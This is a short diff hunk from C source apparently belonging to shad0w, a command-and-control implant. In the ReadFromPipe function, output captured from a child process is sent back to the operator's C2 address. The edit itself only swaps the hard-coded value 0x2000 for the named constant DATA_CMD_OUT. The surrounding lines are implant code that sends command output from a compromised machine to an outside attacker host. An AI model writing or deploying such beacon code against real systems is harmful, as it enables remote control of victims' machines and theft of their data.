@@ -127,7 +127,8 @@ void ReadFromPipe(HANDLE g_hChildStd_OUT_Rd)
         bSuccess = ReadFile( g_hChildStd_OUT_Rd, chBuf, MAX_OUTPUT, &dwRead, NULL);
         
         // send the data to shad0w
-        BeaconCallbackC2(_C2_CALLBACK_ADDRESS, _C2_CALLBACK_PORT, _CALLBACK_USER_AGENT, &rOpCode, (char*)chBuf, 0x2000, dwRead);
+        BeaconCallbackC2(_C2_CALLBACK_ADDRESS, _C2_CALLBACK_PORT, _CALLBACK_USER_AGENT, 
+                         &rOpCode, (char*)chBuf, DATA_CMD_OUT, dwRead);
         
         // clean up the old buffer
         memset(chBuf, '\0', sizeof(chBuf));
